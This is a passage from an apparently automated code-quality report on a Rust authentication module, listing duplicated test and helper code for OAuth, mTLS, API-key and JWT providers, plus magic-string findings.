            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None, // Missing required URL
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        };

        let result = OAuthAuthProvider::new(config);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 557

**Code:**
```
    fn test_parse_token_info_introspection() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": true,
            "sub": "user123",
            "username": "testuser",
            "scope": "read:user repo"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(info.active);
        assert_eq!(info.user_id, Some("user123".to_string()));
        assert_eq!(info.username, Some("testuser".to_string()));
        assert_eq!(info.scopes, vec!["read:user".to_string(), "repo".to_string()]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.8% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 25

**Code:**
```
    fn for_provider(provider: &OAuthProviderType) -> Option<Self> {
        match provider {
            OAuthProviderType::GitHub => Some(Self {
                authorization_url: "https://github.com/login/oauth/authorize",
                token_url: "https://github.com/login/oauth/access_token",
                userinfo_url: "https://api.github.com/user",
                introspection_url: None, // GitHub doesn't support introspection
            }),
            OAuthProviderType::Google => Some(Self {
                authorization_url: "https://accounts.google.com/o/oauth2/v2/auth",
                token_url: "https://oauth2.googleapis.com/token",
                userinfo_url: "https://openidconnect.googleapis.com/v1/userinfo",
                introspection_url: Some("https://oauth2.googleapis.com/tokeninfo"),
            }),
            OAuthProviderType::Okta => None, // Requires tenant-specific URLs
            OAuthProviderType::Custom => None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 592

**Code:**
```
    fn test_parse_token_info_inactive() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": false
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(!info.active);
    }
```

---

#### Magic value '"token"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 267

---

#### Magic value '"Accept"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 300

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 300

---

#### Magic value '"active"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 329

---

#### Magic value '"username"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 352

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 353

---

#### Magic value '"login"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 354

---

#### Magic value '"scope"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 360

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 607

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 608

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 437

**Code:**
```
    fn test_from_headers_if_trusted_accepts_trusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());

        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);

        assert!(cert_info.is_some());
        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 437

**Code:**
```
    fn test_from_headers_if_trusted_accepts_trusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());

        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);

        assert!(cert_info.is_some());
        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 437

**Code:**
```
    fn test_from_headers_if_trusted_accepts_trusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());

        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);

        assert!(cert_info.is_some());
        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 459

**Code:**
```
    fn test_from_headers_if_trusted_rejects_untrusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "spoofed-client".parse().unwrap());

        // Attacker IP not in trusted list
        let attacker_ip: IpAddr = "8.8.8.8".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &attacker_ip, &provider);

        assert!(cert_info.is_none()); // Headers should be rejected
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 459

**Code:**
```
    fn test_from_headers_if_trusted_rejects_untrusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "spoofed-client".parse().unwrap());

        // Attacker IP not in trusted list
        let attacker_ip: IpAddr = "8.8.8.8".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &attacker_ip, &provider);

        assert!(cert_info.is_none()); // Headers should be rejected
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 481

**Code:**
```
    fn test_from_headers_if_trusted_rejects_when_no_trusted_configured() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![], // No trusted IPs!
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "any-client".parse().unwrap());

        // Even localhost should be rejected
        let localhost: IpAddr = "127.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &localhost, &provider);

        assert!(cert_info.is_none()); // No trusted proxies = reject all header auth
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 507

**Code:**
```
    fn test_extract_identity_from_cn() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: Some("service-client".to_string()),
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let identity = provider.extract_identity(&cert_info).unwrap();
        assert_eq!(identity.id, "service-client");
        assert_eq!(identity.name, Some("service-client".to_string()));
        assert!(identity.allowed_tools.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 507

**Code:**
```
    fn test_extract_identity_from_cn() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: Some("service-client".to_string()),
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let identity = provider.extract_identity(&cert_info).unwrap();
        assert_eq!(identity.id, "service-client");
        assert_eq!(identity.name, Some("service-client".to_string()));
        assert!(identity.allowed_tools.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 531

**Code:**
```
    fn test_extract_identity_from_san_dns() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::SanDns,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(50),
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: Some("service-client".to_string()),
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let identity = provider.extract_identity(&cert_info).unwrap();
        assert_eq!(identity.id, "client.example.com");
        assert_eq!(identity.allowed_tools, Some(vec!["read_file".to_string()]));
        assert_eq!(identity.rate_limit, Some(50));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.9% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.8% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Magic value '"success"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 321

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 280

**Code:**
```
    fn test_constant_time_compare_equal() {
        let a = "abc123XYZ";
        let b = "abc123XYZ";
        assert!(ApiKeyProvider::constant_time_compare(a, b));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 280

**Code:**
```
    fn test_constant_time_compare_equal() {
        let a = "abc123XYZ";
        let b = "abc123XYZ";
        assert!(ApiKeyProvider::constant_time_compare(a, b));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 280

**Code:**
```
    fn test_constant_time_compare_equal() {
        let a = "abc123XYZ";
        let b = "abc123XYZ";
        assert!(ApiKeyProvider::constant_time_compare(a, b));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 287

**Code:**
```
    fn test_constant_time_compare_different_content() {
        let a = "abc123XYZ";
        let b = "abc123XYy";  // Last char different
        assert!(!ApiKeyProvider::constant_time_compare(a, b));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 287

**Code:**
```
    fn test_constant_time_compare_different_content() {
        let a = "abc123XYZ";
        let b = "abc123XYy";  // Last char different
        assert!(!ApiKeyProvider::constant_time_compare(a, b));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 294

**Code:**
```
    fn test_constant_time_compare_different_length() {
        let a = "abc123";
        let b = "abc123XYZ";
        assert!(!ApiKeyProvider::constant_time_compare(a, b));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 816

**Code:**
```
    fn test_parse_algorithm_rs_variants() {
        assert_eq!(parse_algorithm("RS256"), Some(Algorithm::RS256));
        assert_eq!(parse_algorithm("RS384"), Some(Algorithm::RS384));
        assert_eq!(parse_algorithm("RS512"), Some(Algorithm::RS512));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 856

**Code:**
```
    fn test_jwks_cache_is_expired_after_duration() {
        let mut cache = JwksCache::new(Duration::from_millis(1));
        cache.fetched_at = Instant::now();
        // Should not be expired immediately
        assert!(!cache.is_expired());
        // Wait for expiry
        std::thread::sleep(Duration::from_millis(5));
        assert!(cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 940

**Code:**
```
    fn test_build_validation_sets_correct_params() {
        let provider = create_simple_provider();
        let validation = provider.build_validation(Algorithm::HS256);
        
        // Validation should be configured with issuer and audience
        // We can't directly inspect private fields, but we can verify it works
        assert!(!validation.algorithms.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 940

**Code:**
```
    fn test_build_validation_sets_correct_params() {
        let provider = create_simple_provider();
        let validation = provider.build_validation(Algorithm::HS256);
        
        // Validation should be configured with issuer and audience
        // We can't directly inspect private fields, but we can verify it works
        assert!(!validation.algorithms.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 816

**Code:**
```
    fn test_parse_algorithm_rs_variants() {
        assert_eq!(parse_algorithm("RS256"), Some(Algorithm::RS256));
        assert_eq!(parse_algorithm("RS384"), Some(Algorithm::RS384));
        assert_eq!(parse_algorithm("RS512"), Some(Algorithm::RS512));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 823

**Code:**
```
    fn test_parse_algorithm_hs_variants() {
        assert_eq!(parse_algorithm("HS256"), Some(Algorithm::HS256));
        assert_eq!(parse_algorithm("HS384"), Some(Algorithm::HS384));
        assert_eq!(parse_algorithm("HS512"), Some(Algorithm::HS512));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.8% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.5% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.4% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 240

**Code:**
```
    fn extract_scopes(&self, claims: &HashMap<String, serde_json::Value>) -> Vec<String> {
        claims
            .get(&self.config.scopes_claim)
            .map(|v| match v {
                // Space-separated string (OAuth2 style)
                serde_json::Value::String(s) => {
                    s.split_whitespace().map(String::from).collect()
                }
                // Array of strings
                serde_json::Value::Array(arr) => {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .map(String::from)
                        .collect()
                }
                _ => vec![],
            })
            .unwrap_or_default()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.3% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.1% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.0% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 848

**Code:**
```
    fn test_jwks_cache_new_starts_expired() {
        let cache = JwksCache::new(Duration::from_secs(3600));
        // Cache should start expired to trigger immediate refresh
        assert!(cache.is_expired());
        assert!(cache.keys.is_empty());
    }
```

---

#### Magic value '"name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 327

---

